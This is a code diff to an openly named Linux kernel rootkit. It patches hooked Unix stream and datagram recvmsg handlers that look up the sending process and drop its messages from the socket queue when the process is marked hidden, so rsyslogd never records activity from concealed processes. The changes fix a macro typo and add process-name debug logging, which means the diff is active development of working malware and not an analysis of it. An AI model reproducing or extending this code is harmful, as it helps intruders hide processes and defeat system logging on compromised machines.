@@ -461,11 +461,13 @@ static int my_unix_stream_recvmsg(struct kiocb *iocb, struct socket *sock, struc
 		}
 		unix_state_unlock(sk);
 		//cred_real_to_ucred(UNIXCB(skb).pid, UNIXCB(skb).cred, &creds);
-		pid = pid_vnr(UNIXCN(skb).pid); // replace cred_real_to_ucred by pid_vnr
-		//my_rootkit_debug("In my_unix_stream_recvmsg creds.pid=%d\n", creds.pid);
+		pid = pid_vnr(UNIXCB(skb).pid); // replace cred_real_to_ucred by pid_vnr
+		char process_name[TASK_COMM_LEN] = "0";	
+		get_process_name(process_name,pid);
+		my_rootkit_debug("In my_unix_stream_recvmsg pid=%d,name=%s\n", pid,process_name);
 		//if (1 == (find=process_should_be_hidden(creds.pid))) {
 		if (1 == (find=process_should_be_hidden(pid))) { // replace creds,pid by pid
-			my_rootkit_debug("rsyslogd tcp: process pid is %d\n",creds.pid);
+			my_rootkit_debug("rsyslogd tcp: process pid is %d\n",pid);
 			skb_dequeue(&sk->sk_receive_queue);
 		}
 	} while(1 == find);
@@ -506,10 +508,12 @@ static int my_unix_dgram_recvmsg(struct kiocb *kio, struct socket *sock, struct 
 		
 		//cred_real_to_ucred(UNIXCB(skb).pid, UNIXCB(skb).cred, &creds);
 		pid = pid_vnr(UNIXCB(skb).pid); // replace cred_real_to_ucred by pid_vnr
-		//my_rootkit_debug("In my_unix_dgram_recvmsg creds.pid=%d\n", creds.pid);
+		char process_name[TASK_COMM_LEN] = "0";
+		get_process_name(process_name,pid);
+		my_rootkit_debug("In my_unix_dgram_recvmsg pid=%d,name=%s\n", pid,process_name);
 		//if (1 == (find=process_should_be_hidden(creds.pid))) {
 		if (1 == (find=process_should_be_hidden(pid))) { // replace creds.pid by pid
-			my_rootkit_debug("rsyslogd udp: process pid is %d\n",creds.pid);
+			my_rootkit_debug("rsyslogd udp: process pid is %d\n",pid);
 			skb_dequeue(&sk->sk_receive_queue);
 		}
 	} while (1 == find);
